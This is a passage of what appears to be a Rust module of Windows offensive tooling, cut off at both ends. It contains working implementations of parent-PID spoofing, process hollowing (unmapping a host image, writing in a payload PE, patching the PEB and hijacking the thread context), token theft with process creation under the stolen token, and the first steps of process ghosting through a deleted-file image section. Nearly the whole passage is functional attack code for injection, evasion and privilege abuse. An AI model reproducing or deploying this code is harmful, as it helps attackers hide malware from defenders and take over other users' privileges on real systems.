                "UpdateProcThreadAttribute failed".to_string(),
            ));
        }

        // Set up STARTUPINFOEXW with the attribute list
        let mut startup_info_ex: STARTUPINFOEXW = std::mem::zeroed();
        startup_info_ex.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
        startup_info_ex.lpAttributeList = attr_list;

        let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

        let mut creation_flags = EXTENDED_STARTUPINFO_PRESENT;
        if suspended {
            creation_flags |= CREATE_SUSPENDED;
        }

        let result = CreateProcessW(
            None,
            windows::core::PWSTR(cmd_wide.as_mut_ptr()),
            None,
            None,
            false,
            creation_flags,
            None,
            None,
            &startup_info_ex.StartupInfo,
            &mut process_info,
        );

        // Clean up attribute list and parent handle
        DeleteProcThreadAttributeList(attr_list);
        let _ = CloseHandle(h_parent);

        if result.is_err() {
            return Err(MiscError::CreateProcessFailed(format!(
                "CreateProcessW with PPID spoofing failed for {}",
                exe_path
            )));
        }

        let pid = process_info.dwProcessId;
        let tid = process_info.dwThreadId;

        // Close handles
        let _ = CloseHandle(process_info.hThread);
        let _ = CloseHandle(process_info.hProcess);

        Ok((pid, tid))
    }
}

/// Perform process hollowing: create a host process suspended, replace its image with a payload PE, then resume.
///
/// Creates a suspended host process, unmaps its original image, allocates memory at the
/// payload's preferred base, writes PE headers and sections individually, applies base
/// relocations if needed, patches PEB ImageBaseAddress via the Rdx register, sets proper
/// per-section memory permissions, hijacks the thread entry point via Rcx, and resumes.
///
/// Returns the PID of the hollowed process on success.
///
/// # Arguments
/// * `host_path` - Path to the host executable (will be hollowed)
/// * `payload_path` - Path to the payload PE to inject (64-bit only)
pub fn hollow_process(host_path: &str, payload_path: &str) -> Result<u32, MiscError> {
    // Section characteristic flags
    const IMAGE_SCN_MEM_EXECUTE: u32 = 0x20000000;
    const IMAGE_SCN_MEM_READ: u32 = 0x40000000;
    const IMAGE_SCN_MEM_WRITE: u32 = 0x80000000;

    // Validate both files exist
    if !Path::new(host_path).exists() {
        return Err(MiscError::FileNotFound(host_path.to_string()));
    }
    if !Path::new(payload_path).exists() {
        return Err(MiscError::FileNotFound(payload_path.to_string()));
    }

    // Read payload PE file
    let data = std::fs::read(payload_path)
        .map_err(|_| MiscError::FileReadFailed(payload_path.to_string()))?;

    // Parse DOS header
    if data.len() < 64 {
        return Err(MiscError::InvalidPE("File too small for DOS header".into()));
    }
    let dos_magic = u16::from_le_bytes([data[0], data[1]]);
    if dos_magic != 0x5A4D {
        return Err(MiscError::InvalidPE("Invalid DOS magic (not MZ)".into()));
    }
    let pe_offset = u32::from_le_bytes([data[60], data[61], data[62], data[63]]) as usize;

    // Parse and validate PE signature
    if data.len() < pe_offset + 4 {
        return Err(MiscError::InvalidPE("File too small for PE signature".into()));
    }
    let pe_sig = u32::from_le_bytes([
        data[pe_offset],
        data[pe_offset + 1],
        data[pe_offset + 2],
        data[pe_offset + 3],
    ]);
    if pe_sig != 0x00004550 {
        return Err(MiscError::InvalidPE("Invalid PE signature".into()));
    }

    // COFF header
    let coff_offset = pe_offset + 4;
    if data.len() < coff_offset + 20 {
        return Err(MiscError::InvalidPE("File too small for COFF header".into()));
    }
    let num_sections = u16::from_le_bytes([data[coff_offset + 2], data[coff_offset + 3]]) as usize;
    let optional_header_size =
        u16::from_le_bytes([data[coff_offset + 16], data[coff_offset + 17]]) as usize;

    // Optional header — must be PE32+ (64-bit)
    let opt_offset = coff_offset + 20;
    if data.len() < opt_offset + 2 {
        return Err(MiscError::InvalidPE("File too small for optional header".into()));
    }
    let opt_magic = u16::from_le_bytes([data[opt_offset], data[opt_offset + 1]]);
    if opt_magic != 0x20b {
        return Err(MiscError::ArchMismatch(
            "Only PE32+ (64-bit) executables are supported".into(),
        ));
    }

    // PE32+ optional header fields
    if data.len() < opt_offset + 112 {
        return Err(MiscError::InvalidPE("Optional header too small".into()));
    }

    let entry_point_rva = u32::from_le_bytes([
        data[opt_offset + 16],
        data[opt_offset + 17],
        data[opt_offset + 18],
        data[opt_offset + 19],
    ]) as usize;

    let image_base = u64::from_le_bytes([
        data[opt_offset + 24],
        data[opt_offset + 25],
        data[opt_offset + 26],
        data[opt_offset + 27],
        data[opt_offset + 28],
        data[opt_offset + 29],
        data[opt_offset + 30],
        data[opt_offset + 31],
    ]);

    let size_of_image = u32::from_le_bytes([
        data[opt_offset + 56],
        data[opt_offset + 57],
        data[opt_offset + 58],
        data[opt_offset + 59],
    ]) as usize;

    let size_of_headers = u32::from_le_bytes([
        data[opt_offset + 60],
        data[opt_offset + 61],
        data[opt_offset + 62],
        data[opt_offset + 63],
    ]) as usize;

    // Base relocation directory: index 5 (offset 112 + 5*8 = 152)
    let reloc_dir_rva;
    let reloc_dir_size;
    if data.len() >= opt_offset + 160 {
        reloc_dir_rva = u32::from_le_bytes([
            data[opt_offset + 152],
            data[opt_offset + 153],
            data[opt_offset + 154],
            data[opt_offset + 155],
        ]) as usize;
        reloc_dir_size = u32::from_le_bytes([
            data[opt_offset + 156],
            data[opt_offset + 157],
            data[opt_offset + 158],
            data[opt_offset + 159],
        ]) as usize;
    } else {
        reloc_dir_rva = 0;
        reloc_dir_size = 0;
    }

    // Parse section headers (including characteristics for per-section permissions)
    let sections_offset = opt_offset + optional_header_size;

    struct SectionInfo {
        virtual_address: usize,
        raw_data_offset: usize,
        raw_data_size: usize,
        characteristics: u32,
    }

    let mut sections = Vec::new();
    for i in 0..num_sections {
        let s_off = sections_offset + i * 40;
        if data.len() < s_off + 40 {
            break;
        }
        let virtual_address = u32::from_le_bytes([
            data[s_off + 12],
            data[s_off + 13],
            data[s_off + 14],
            data[s_off + 15],
        ]) as usize;
        let raw_data_size = u32::from_le_bytes([
            data[s_off + 16],
            data[s_off + 17],
            data[s_off + 18],
            data[s_off + 19],
        ]) as usize;
        let raw_data_offset = u32::from_le_bytes([
            data[s_off + 20],
            data[s_off + 21],
            data[s_off + 22],
            data[s_off + 23],
        ]) as usize;
        let characteristics = u32::from_le_bytes([
            data[s_off + 36],
            data[s_off + 37],
            data[s_off + 38],
            data[s_off + 39],
        ]);
        sections.push(SectionInfo {
            virtual_address,
            raw_data_offset,
            raw_data_size,
            characteristics,
        });
    }

    // Build command line for host process
    let cmd_line = format!("\"{}\"", host_path);
    let mut cmd_wide: Vec<u16> = cmd_line.encode_utf16().chain(std::iter::once(0)).collect();

    unsafe {
        // Step 1: Create host process SUSPENDED
        let mut startup_info: STARTUPINFOW = std::mem::zeroed();
        startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;

        let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

        CreateProcessW(
            None,
            windows::core::PWSTR(cmd_wide.as_mut_ptr()),
            None,
            None,
            false,
            CREATE_SUSPENDED,
            None,
            None,
            &startup_info,
            &mut process_info,
        )
        .map_err(|_| {
            MiscError::CreateProcessFailed(format!(
                "CreateProcessW failed for host {}",
                host_path
            ))
        })?;

        let process_handle = process_info.hProcess;
        let thread_handle = process_info.hThread;
        let pid = process_info.dwProcessId;

        // Helper to clean up on error
        let cleanup = |ph: HANDLE, th: HANDLE| {
            let _ = TerminateProcess(ph, 1);
            let _ = CloseHandle(th);
            let _ = CloseHandle(ph);
        };

        // Step 2: Get thread context — Rdx holds the PEB address
        let mut context: CONTEXT = std::mem::zeroed();
        context.ContextFlags = CONTEXT_FULL_AMD64;

        if GetThreadContext(thread_handle, &mut context).is_err() {
            cleanup(process_handle, thread_handle);
            return Err(MiscError::GetContextFailed);
        }

        let peb_address = context.Rdx;

        // Read original image base from PEB (offset 0x10 = ImageBaseAddress / Reserved3[1])
        let peb_image_base_offset = peb_address + 0x10;
        let mut original_image_base: u64 = 0;

        if ReadProcessMemory(
            process_handle,
            peb_image_base_offset as *const _,
            &mut original_image_base as *mut _ as *mut _,
            8,
            None,
        )
        .is_err()
        {
            cleanup(process_handle, thread_handle);
            return Err(MiscError::PebReadFailed);
        }

        // Step 3: Unmap original image to free the preferred base address
        let unmap_status = NtUnmapViewOfSection(
            process_handle.0 as *mut _,
            original_image_base as *mut _,
        );

        if unmap_status != 0 {
            cleanup(process_handle, thread_handle);
            return Err(MiscError::NtUnmapFailed);
        }

        // Step 4: Allocate remote memory at payload's preferred ImageBase
        let mut allocated_base = VirtualAllocEx(
            process_handle,
            Some(image_base as *const _),
            size_of_image,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        // Fallback: allocate at any address if preferred base is unavailable
        if allocated_base.is_null() {
            allocated_base = VirtualAllocEx(
                process_handle,
                None,
                size_of_image,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
        }

        if allocated_base.is_null() {
            cleanup(process_handle, thread_handle);
            return Err(MiscError::AllocFailed);
        }

        let actual_base = allocated_base as u64;
        let delta = actual_base.wrapping_sub(image_base) as i64;

        // Step 5: Write PE headers to remote process
        let header_write_len = size_of_headers.min(data.len());
        if WriteProcessMemory(
            process_handle,
            allocated_base,
            data.as_ptr() as *const _,
            header_write_len,
            None,
        )
        .is_err()
        {
            cleanup(process_handle, thread_handle);
            return Err(MiscError::WriteFailed);
        }

        // Step 6: Write each section individually to remote process
        for section in &sections {
            if section.raw_data_size == 0 || section.virtual_address == 0 {
                continue;
            }

            let src_start = section.raw_data_offset;
            let src_end = (src_start + section.raw_data_size).min(data.len());
            let copy_len = src_end.saturating_sub(src_start);

            if copy_len == 0 {
                continue;
            }

            let remote_section_addr = (actual_base as usize + section.virtual_address) as *mut _;

            if WriteProcessMemory(
                process_handle,
                remote_section_addr,
                data[src_start..].as_ptr() as *const _,
                copy_len,
                None,
            )
            .is_err()
            {
                cleanup(process_handle, thread_handle);
                return Err(MiscError::WriteFailed);
            }
        }

        // Step 7: Apply base relocations if allocation is not at preferred base
        if reloc_dir_rva != 0 && reloc_dir_size != 0 && delta != 0 {
            // Read the relocation data from the remote process (already written)
            let mut reloc_data = vec![0u8; reloc_dir_size];
            if ReadProcessMemory(
                process_handle,
                (actual_base as usize + reloc_dir_rva) as *const _,
                reloc_data.as_mut_ptr() as *mut _,
                reloc_dir_size,
                None,
            )
            .is_err()
            {
                cleanup(process_handle, thread_handle);
                return Err(MiscError::ReadFailed);
            }

            let mut reloc_offset = 0usize;
            while reloc_offset + 8 <= reloc_dir_size {
                let block_rva = u32::from_le_bytes([
                    reloc_data[reloc_offset],
                    reloc_data[reloc_offset + 1],
                    reloc_data[reloc_offset + 2],
                    reloc_data[reloc_offset + 3],
                ]) as usize;
                let block_size = u32::from_le_bytes([
                    reloc_data[reloc_offset + 4],
                    reloc_data[reloc_offset + 5],
                    reloc_data[reloc_offset + 6],
                    reloc_data[reloc_offset + 7],
                ]) as usize;

                if block_size < 8 {
                    break;
                }

                let num_entries = (block_size - 8) / 2;
                for i in 0..num_entries {
                    let entry_off = reloc_offset + 8 + i * 2;
                    if entry_off + 2 > reloc_dir_size {
                        break;
                    }
                    let entry =
                        u16::from_le_bytes([reloc_data[entry_off], reloc_data[entry_off + 1]]);
                    let reloc_type = (entry >> 12) as u8;
                    let offset = (entry & 0x0FFF) as usize;
                    let target_rva = block_rva + offset;
                    let remote_target = (actual_base as usize + target_rva) as *mut _;

                    match reloc_type {
                        10 => {
                            // IMAGE_REL_BASED_DIR64
                            let mut val: u64 = 0;
                            if ReadProcessMemory(
                                process_handle,
                                remote_target as *const _,
                                &mut val as *mut _ as *mut _,
                                8,
                                None,
                            )
                            .is_ok()
                            {
                                let new_val = (val as i64).wrapping_add(delta) as u64;
                                let _ = WriteProcessMemory(
                                    process_handle,
                                    remote_target,
                                    &new_val as *const _ as *const _,
                                    8,
                                    None,
                                );
                            }
                        }
                        3 => {
                            // IMAGE_REL_BASED_HIGHLOW
                            let mut val: u32 = 0;
                            if ReadProcessMemory(
                                process_handle,
                                remote_target as *const _,
                                &mut val as *mut _ as *mut _,
                                4,
                                None,
                            )
                            .is_ok()
                            {
                                let new_val = (val as i32).wrapping_add(delta as i32) as u32;
                                let _ = WriteProcessMemory(
                                    process_handle,
                                    remote_target,
                                    &new_val as *const _ as *const _,
                                    4,
                                    None,
                                );
                            }
                        }
                        0 => {} // IMAGE_REL_BASED_ABSOLUTE — padding, skip
                        _ => {}
                    }
                }

                reloc_offset += block_size;
            }
        }

        // Step 8: Patch PEB ImageBaseAddress to point to our PE (via Rdx + 0x10)
        if WriteProcessMemory(
            process_handle,
            peb_image_base_offset as *mut _,
            &actual_base as *const _ as *const _,
            8,
            None,
        )
        .is_err()
        {
            cleanup(process_handle, thread_handle);
            return Err(MiscError::PebReadFailed);
        }

        // Step 9: Fix per-section memory permissions based on section characteristics
        for section in &sections {
            if section.raw_data_size == 0 || section.virtual_address == 0 {
                continue;
            }

            let chars = section.characteristics;
            let protection = if (chars & IMAGE_SCN_MEM_EXECUTE) != 0
                && (chars & IMAGE_SCN_MEM_WRITE) != 0
                && (chars & IMAGE_SCN_MEM_READ) != 0
            {
                PAGE_EXECUTE_READWRITE
            } else if (chars & IMAGE_SCN_MEM_EXECUTE) != 0 && (chars & IMAGE_SCN_MEM_READ) != 0 {
                PAGE_EXECUTE_READ
            } else if (chars & IMAGE_SCN_MEM_EXECUTE) != 0 && (chars & IMAGE_SCN_MEM_WRITE) != 0 {
                PAGE_EXECUTE_WRITECOPY
            } else if (chars & IMAGE_SCN_MEM_EXECUTE) != 0 {
                PAGE_EXECUTE
            } else if (chars & IMAGE_SCN_MEM_WRITE) != 0 && (chars & IMAGE_SCN_MEM_READ) != 0 {
                PAGE_READWRITE
            } else if (chars & IMAGE_SCN_MEM_READ) != 0 {
                PAGE_READONLY
            } else if (chars & IMAGE_SCN_MEM_WRITE) != 0 {
                PAGE_WRITECOPY
            } else {
                PAGE_READONLY
            };

            let remote_section_addr = (actual_base as usize + section.virtual_address) as *const _;
            let mut old_protect = PAGE_PROTECTION_FLAGS(0);
            let _ = VirtualProtectEx(
                process_handle,
                remote_section_addr,
                section.raw_data_size,
                protection,
                &mut old_protect,
            );
        }

        // Step 10: Hijack thread — set Rcx to new entry point
        let new_entry_point = actual_base + entry_point_rva as u64;
        context.Rcx = new_entry_point;

        if SetThreadContext(thread_handle, &context).is_err() {
            cleanup(process_handle, thread_handle);
            return Err(MiscError::SetContextFailed);
        }

        // Step 11: Resume thread
        let resume_result = ResumeThread(thread_handle);
        if resume_result == u32::MAX {
            cleanup(process_handle, thread_handle);
            return Err(MiscError::ResumeThreadFailed(process_info.dwThreadId));
        }

        // Close handles
        let _ = CloseHandle(thread_handle);
        let _ = CloseHandle(process_handle);

        Ok(pid)
    }
}

/// Steal a process token and launch a new process under that token's security context.
///
/// Opens the target process, duplicates its primary token, enables
/// `SeAssignPrimaryTokenPrivilege`, impersonates the token, then calls
/// `CreateProcessAsUserW` to spawn a new process.
///
/// Returns (pid, tid) of the newly created process on success.
///
/// # Arguments
/// * `pid` - PID of the process whose token will be stolen
/// * `exe_path` - Path to the executable to launch
/// * `args` - Command line arguments (can be empty)
pub fn steal_token(pid: u32, exe_path: &str, args: &str) -> Result<(u32, u32), MiscError> {
    // Validate executable exists
    if !Path::new(exe_path).exists() {
        return Err(MiscError::FileNotFound(exe_path.to_string()));
    }

    // Build command line: "exe_path" args
    let cmd_line = if args.is_empty() {
        format!("\"{}\"", exe_path)
    } else {
        format!("\"{}\" {}", exe_path, args)
    };

    let mut cmd_wide: Vec<u16> = cmd_line.encode_utf16().chain(std::iter::once(0)).collect();

    unsafe {
        // Open target process with limited query permissions (sufficient for token access)
        let process_handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
            .map_err(|_| MiscError::OpenProcessFailed(pid))?;

        // Open the process's primary token
        let mut token_handle = HANDLE::default();
        let result = OpenProcessToken(
            process_handle,
            TOKEN_QUERY | TOKEN_DUPLICATE,
            &mut token_handle,
        );

        if result.is_err() {
            let _ = CloseHandle(process_handle);
            return Err(MiscError::OpenTokenFailed(pid));
        }

        // Duplicate the token as a primary token
        let mut new_token_handle = HANDLE::default();
        let result = DuplicateTokenEx(
            token_handle,
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
            None,
            SecurityAnonymous,
            TokenPrimary,
            &mut new_token_handle,
        );

        if result.is_err() {
            let _ = CloseHandle(token_handle);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::DuplicateTokenFailed);
        }

        // Enable SeAssignPrimaryTokenPrivilege (LUID LowPart=3, HighPart=0)
        let mut token_privileges: TOKEN_PRIVILEGES = std::mem::zeroed();
        token_privileges.PrivilegeCount = 1;
        token_privileges.Privileges[0].Luid = LUID {
            LowPart: 3,
            HighPart: 0,
        };
        token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        let result = AdjustTokenPrivileges(
            new_token_handle,
            false,
            Some(&token_privileges),
            0,
            None,
            None,
        );

        if result.is_err() {
            let _ = CloseHandle(new_token_handle);
            let _ = CloseHandle(token_handle);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::AdjustPrivilegesFailed);
        }

        // Impersonate the duplicated token
        let result = ImpersonateLoggedOnUser(new_token_handle);

        if result.is_err() {
            let _ = CloseHandle(new_token_handle);
            let _ = CloseHandle(token_handle);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::ImpersonateFailed);
        }

        // Create a new process under the stolen token
        let mut startup_info: STARTUPINFOW = std::mem::zeroed();
        startup_info.cb = std::mem::size_of::<STARTUPINFOW>() as u32;

        let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

        let result = CreateProcessAsUserW(
            new_token_handle,
            None,
            windows::core::PWSTR(cmd_wide.as_mut_ptr()),
            None,
            None,
            true,
            Default::default(),
            None,
            None,
            &startup_info,
            &mut process_info,
        );

        // Revert security context regardless of result
        let _ = RevertToSelf();

        if result.is_err() {
            let _ = CloseHandle(new_token_handle);
            let _ = CloseHandle(token_handle);
            let _ = CloseHandle(process_handle);
            return Err(MiscError::CreateProcessAsUserFailed(format!(
                "CreateProcessAsUserW failed for {}",
                exe_path
            )));
        }

        let new_pid = process_info.dwProcessId;
        let new_tid = process_info.dwThreadId;

        // Close all handles
        let _ = CloseHandle(process_info.hThread);
        let _ = CloseHandle(process_info.hProcess);
        let _ = CloseHandle(new_token_handle);
        let _ = CloseHandle(token_handle);
        let _ = CloseHandle(process_handle);

        Ok((new_pid, new_tid))
    }
}

/// Process Ghosting: create a process whose backing file no longer exists on disk.
///
/// Algorithm:
/// 1. Read payload PE into memory
/// 2. Create temp file with unique name, mark it for deletion via NtSetInformationFile
/// 3. Write payload bytes to the file
/// 4. Create image section via NtCreateSection(SEC_IMAGE)
/// 5. Close file handle (triggers deletion), section survives
/// 6. Create process from section via NtCreateProcessEx
/// 7. Set up PEB, process parameters, environment, and create initial thread via NtCreateThreadEx
///
/// Returns the PID of the ghosted process on success.
///
/// # Arguments
/// * `exe_path` - Path to the payload executable (64-bit PE)
///
/// # Safety
/// This function uses unsafe Windows NT API calls to manipulate processes and memory.
pub fn ghost_process(exe_path: &str) -> Result<u32, MiscError> {
    // Validate executable exists
    if !Path::new(exe_path).exists() {
        return Err(MiscError::FileNotFound(exe_path.to_string()));
    }

    // Read payload PE file
    let data = std::fs::read(exe_path)
        .map_err(|_| MiscError::FileReadFailed(exe_path.to_string()))?;

    // Validate PE header basics
    if data.len() < 64 {
        return Err(MiscError::InvalidPE("File too small for DOS header".into()));
    }
    let dos_magic = u16::from_le_bytes([data[0], data[1]]);
    if dos_magic != 0x5A4D {
        return Err(MiscError::InvalidPE("Invalid DOS magic (not MZ)".into()));
    }
    let pe_offset = u32::from_le_bytes([data[60], data[61], data[62], data[63]]) as usize;
    if data.len() < pe_offset + 4 {
        return Err(MiscError::InvalidPE("File too small for PE signature".into()));
    }
    let pe_sig = u32::from_le_bytes([
        data[pe_offset],
        data[pe_offset + 1],
        data[pe_offset + 2],
        data[pe_offset + 3],
    ]);
    if pe_sig != 0x00004550 {
        return Err(MiscError::InvalidPE("Invalid PE signature".into()));
    }

    // Check PE32+ (64-bit)
    let coff_offset = pe_offset + 4;
    if data.len() < coff_offset + 20 {
        return Err(MiscError::InvalidPE("File too small for COFF header".into()));
    }
    let opt_offset = coff_offset + 20;
    if data.len() < opt_offset + 20 {
        return Err(MiscError::InvalidPE("File too small for optional header".into()));
    }
    let opt_magic = u16::from_le_bytes([data[opt_offset], data[opt_offset + 1]]);
    if opt_magic != 0x20b {
        return Err(MiscError::ArchMismatch(
            "Only PE32+ (64-bit) executables are supported for ghosting".into(),
        ));
    }

    // Get entry point RVA from local PE buffer (no need to read from remote)
    let entry_point_rva = u32::from_le_bytes([
        data[opt_offset + 16],
        data[opt_offset + 17],
        data[opt_offset + 18],
        data[opt_offset + 19],
    ]) as u64;

    if entry_point_rva == 0 {
        return Err(MiscError::InvalidPE("Entry point RVA is zero".into()));
    }

    unsafe {
        // Resolve ntdll functions dynamically
        let ntdll = GetModuleHandleA(PCSTR(b"ntdll.dll\0".as_ptr()))
            .map_err(|_| MiscError::GhostSetupFailed("Failed to get ntdll.dll handle".into()))?;

        let get_proc = |name: &str| -> Result<*const (), MiscError> {
            let cname = CString::new(name).unwrap();
            GetProcAddress(ntdll, PCSTR(cname.as_ptr() as *const u8))
                .map(|p| p as *const ())
                .ok_or_else(|| MiscError::GhostSetupFailed(format!("Failed to resolve {}", name)))
        };

        // ---- Struct definitions ----

        #[repr(C)]
        struct UnicodeString {
            length: u16,
            maximum_length: u16,
            buffer: *mut u16,
        }

        impl UnicodeString {
            fn from_wide(wide: &[u16]) -> Self {
                let byte_len = ((wide.len().saturating_sub(1)) * 2) as u16;
                Self {
                    length: byte_len,
                    maximum_length: byte_len + 2,
                    buffer: wide.as_ptr() as *mut u16,
                }
            }
        }

        #[repr(C)]
        struct ObjectAttributes {
            length: u32,
            root_directory: HANDLE,
            object_name: *mut UnicodeString,
            attributes: u32,
            security_descriptor: *mut std::ffi::c_void,
            security_quality_of_service: *mut std::ffi::c_void,
        }

        #[repr(C)]
        struct IoStatusBlock {
            status: i32,
            _pad: u32,
            information: usize,
        }

        // ---- Function type definitions ----

        type NtOpenFileFn = unsafe extern "system" fn(
            *mut HANDLE, u32, *mut ObjectAttributes, *mut IoStatusBlock, u32, u32,
        ) -> i32;

        type NtSetInformationFileFn = unsafe extern "system" fn(
            HANDLE, *mut IoStatusBlock, *mut std::ffi::c_void, u32, u32,
        ) -> i32;

        type NtWriteFileFn = unsafe extern "system" fn(
            HANDLE, HANDLE, *mut std::ffi::c_void, *mut std::ffi::c_void,
            *mut IoStatusBlock, *const u8, u32, *mut i64, *mut u32,
        ) -> i32;

        type NtCreateSectionFn = unsafe extern "system" fn(
            *mut HANDLE, u32, *mut std::ffi::c_void, *mut i64, u32, u32, HANDLE,
        ) -> i32;

        type NtCreateProcessExFn = unsafe extern "system" fn(
            *mut HANDLE, u32, *mut std::ffi::c_void, HANDLE, u32, HANDLE, HANDLE, HANDLE, u8,
        ) -> i32;

        type NtQueryInformationProcessFn = unsafe extern "system" fn(
            HANDLE, u32, *mut std::ffi::c_void, u32, *mut u32,
        ) -> i32;

        type NtReadVirtualMemoryFn = unsafe extern "system" fn(
            HANDLE, *const std::ffi::c_void, *mut std::ffi::c_void, usize, *mut usize,
        ) -> i32;

        type NtAllocateVirtualMemoryFn = unsafe extern "system" fn(
            HANDLE, *mut *mut std::ffi::c_void, usize, *mut usize, u32, u32,
        ) -> i32;

        type NtWriteVirtualMemoryFn = unsafe extern "system" fn(
            HANDLE, *mut std::ffi::c_void, *const std::ffi::c_void, usize, *mut usize,
        ) -> i32;

        type RtlCreateProcessParametersExFn = unsafe extern "system" fn(
            *mut *mut std::ffi::c_void, *mut UnicodeString, *mut UnicodeString,
            *mut UnicodeString, *mut UnicodeString, *mut std::ffi::c_void, *mut UnicodeString,
            *mut UnicodeString, *mut UnicodeString, *mut UnicodeString, u32,
        ) -> i32;

        type RtlDestroyProcessParametersFn = unsafe extern "system" fn(
            *mut std::ffi::c_void,
        ) -> i32;

        type NtCreateThreadExFn = unsafe extern "system" fn(
            *mut HANDLE, u32, *mut std::ffi::c_void, HANDLE, *const std::ffi::c_void,
            *const std::ffi::c_void, u32, usize, usize, usize, *mut std::ffi::c_void,
        ) -> i32;

        type CreateEnvironmentBlockFn = unsafe extern "system" fn(
            *mut *mut std::ffi::c_void, HANDLE, i32,
        ) -> i32;

        type DestroyEnvironmentBlockFn = unsafe extern "system" fn(
            *mut std::ffi::c_void,
        ) -> i32;

        // ---- Resolve all NT functions ----
        let nt_open_file: NtOpenFileFn =
            std::mem::transmute(get_proc("NtOpenFile")?);
        let nt_set_information_file: NtSetInformationFileFn =
            std::mem::transmute(get_proc("NtSetInformationFile")?);
        let nt_write_file: NtWriteFileFn =
            std::mem::transmute(get_proc("NtWriteFile")?);
        let nt_create_section: NtCreateSectionFn =
            std::mem::transmute(get_proc("NtCreateSection")?);
        let nt_create_process_ex: NtCreateProcessExFn =
            std::mem::transmute(get_proc("NtCreateProcessEx")?);
        let nt_query_info_process: NtQueryInformationProcessFn =
            std::mem::transmute(get_proc("NtQueryInformationProcess")?);
        let nt_read_virtual_memory: NtReadVirtualMemoryFn =
            std::mem::transmute(get_proc("NtReadVirtualMemory")?);
        let nt_allocate_virtual_memory: NtAllocateVirtualMemoryFn =
            std::mem::transmute(get_proc("NtAllocateVirtualMemory")?);
        let nt_write_virtual_memory: NtWriteVirtualMemoryFn =
            std::mem::transmute(get_proc("NtWriteVirtualMemory")?);
        let rtl_create_process_parameters_ex: RtlCreateProcessParametersExFn =
            std::mem::transmute(get_proc("RtlCreateProcessParametersEx")?);
        let rtl_destroy_process_parameters: RtlDestroyProcessParametersFn =
            std::mem::transmute(get_proc("RtlDestroyProcessParameters")?);
        let nt_create_thread_ex: NtCreateThreadExFn =
            std::mem::transmute(get_proc("NtCreateThreadEx")?);

        // Resolve userenv.dll functions for CreateEnvironmentBlock
        let userenv = LoadLibraryA(PCSTR(b"userenv.dll\0".as_ptr()))
            .map_err(|_| MiscError::GhostSetupFailed("Failed to load userenv.dll".into()))?;
        let create_environment_block: CreateEnvironmentBlockFn = std::mem::transmute(
            GetProcAddress(userenv, PCSTR(b"CreateEnvironmentBlock\0".as_ptr()))
                .ok_or_else(|| MiscError::GhostSetupFailed("Failed to resolve CreateEnvironmentBlock".into()))?
        );
        let destroy_environment_block: DestroyEnvironmentBlockFn = std::mem::transmute(
            GetProcAddress(userenv, PCSTR(b"DestroyEnvironmentBlock\0".as_ptr()))
                .ok_or_else(|| MiscError::GhostSetupFailed("Failed to resolve DestroyEnvironmentBlock".into()))?
        );

        // ==== Step 1: Create temp file ====
        let unique_id = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0);
        let temp_filename = format!("PG_{:X}.tmp", unique_id);
        let temp_path = std::env::temp_dir().join(&temp_filename);
        let temp_path_str = temp_path.to_string_lossy().to_string();

        // Create empty temp file so NtOpenFile can open it
        std::fs::File::create(&temp_path)
            .map_err(|_| MiscError::GhostFileFailed("Failed to create temp file".into()))?;

        // Convert to NT path format: \??\C:\...\PGxxxx.tmp
        let nt_tmp_path = format!("\\??\\{}", temp_path_str);
        let nt_tmp_wide: Vec<u16> = nt_tmp_path.encode_utf16().chain(std::iter::once(0)).collect();

        // ==== Step 2: Create ghost section ====
        let mut file_name_us = UnicodeString::from_wide(&nt_tmp_wide);
        let mut object_attr = ObjectAttributes {
            length: std::mem::size_of::<ObjectAttributes>() as u32,
            root_directory: HANDLE::default(),
            object_name: &mut file_name_us,
            attributes: 0x40, // OBJ_CASE_INSENSITIVE
            security_descriptor: std::ptr::null_mut(),
            security_quality_of_service: std::ptr::null_mut(),
        };

        let mut io_status = IoStatusBlock { status: 0, _pad: 0, information: 0 };
        let mut file_handle = HANDLE::default();

        // NtOpenFile with DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE
        let status = nt_open_file(
            &mut file_handle,
            0x00010000 | 0x00100000 | 0x80000000 | 0x40000000,
            &mut object_attr,
            &mut io_status,
            0x01 | 0x02, // FILE_SHARE_READ | FILE_SHARE_WRITE
            0x00000020,  // FILE_SYNCHRONOUS_IO_NONALERT
        );

        if status != 0 {
            let _ = std::fs::remove_file(&temp_path);
            return Err(MiscError::GhostFileFailed(format!(
                "NtOpenFile failed with status 0x{:08X}", status
            )));
        }

        // Mark file for deletion (FileDispositionInformation, class 13)
        let mut delete_flag: u8 = 1; // DeleteFile = TRUE
        let status = nt_set_information_file(
            file_handle,
            &mut io_status,
            &mut delete_flag as *mut _ as *mut _,
            std::mem::size_of::<u8>() as u32,
            13, // FileDispositionInformation
        );

        if status != 0 {
            let _ = CloseHandle(file_handle);
            return Err(MiscError::GhostFileFailed(format!(
                "NtSetInformationFile failed with status 0x{:08X}", status
            )));
        }

        // Write payload to temp file via NtWriteFile
        let mut byte_offset: i64 = 0;
        let status = nt_write_file(
            file_handle,
            HANDLE::default(), // Event
            std::ptr::null_mut(), // ApcRoutine
            std::ptr::null_mut(), // ApcContext
            &mut io_status,
            data.as_ptr(),
            data.len() as u32,
            &mut byte_offset,
            std::ptr::null_mut(), // Key
        );

        if status != 0 {
            let _ = CloseHandle(file_handle);
            return Err(MiscError::GhostFileFailed(format!(
                "NtWriteFile failed with status 0x{:08X}", status
            )));
        }

        // Create SEC_IMAGE section from the file
        let mut section_handle = HANDLE::default();
        let status = nt_create_section(
            &mut section_handle,
            0xF001F, // SECTION_ALL_ACCESS
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0x02,      // PAGE_READONLY
            0x1000000, // SEC_IMAGE
            file_handle,
        );

        // Close file handle - triggers deletion, section survives
        let _ = CloseHandle(file_handle);

